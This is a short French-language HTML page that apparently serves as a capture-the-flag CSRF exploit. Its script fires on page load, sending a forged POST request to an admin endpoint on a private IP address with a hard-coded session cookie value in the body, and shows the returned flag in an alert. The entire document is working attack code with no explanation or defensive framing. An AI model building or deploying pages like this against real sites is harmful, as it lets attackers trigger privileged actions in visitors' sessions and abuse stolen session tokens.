<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>CSRF Attack</title>
</head>
<body>
    <h1>Attaque CSRF</h1>
    <p>En visitant cette page, une requête CSRF est envoyée.</p>
    <script>
        // Créer une requête XMLHttpRequest pour envoyer une requête POST
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://192.168.122.1:32768/admin', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        // // xhr.withCredentials = true;  // Important pour envoyer les cookies de session

        xhr.onload = function() {
            if (xhr.status === 200) {
                alert('Flag obtenu : ' + xhr.responseText);
            } else {
                alert('Échec de la requête CSRF : ' + xhr.status);
            }
        };

        let data = JSON.stringify({ cookie: "s:0brr08oCzG77weft2bBCcd-50P3FRKhi.B3ppKHSLjfg/O46MvfDw9xkXG5zGRPZYbWR04HlHWR4" });
        xhr.send(data);
    </script>
</body>
</html>
